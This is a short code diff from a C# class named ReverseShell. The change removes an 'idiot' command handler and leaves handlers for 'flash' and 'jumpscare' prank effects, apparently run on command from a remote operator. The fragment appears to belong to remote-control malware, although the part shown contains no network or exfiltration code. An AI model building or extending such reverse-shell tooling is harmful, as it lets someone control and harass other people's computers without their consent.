@@ -337,10 +337,6 @@ class ReverseShell
                     {
                         Task.Run(() => ShowFlash());
                     }
-                    if (command.ToLower() == "idiot")
-                    {
-                        Task.Run(() => ShowIdiot());
-                    }
 
                     if (command.ToLower() == "jumpscare")
                     {
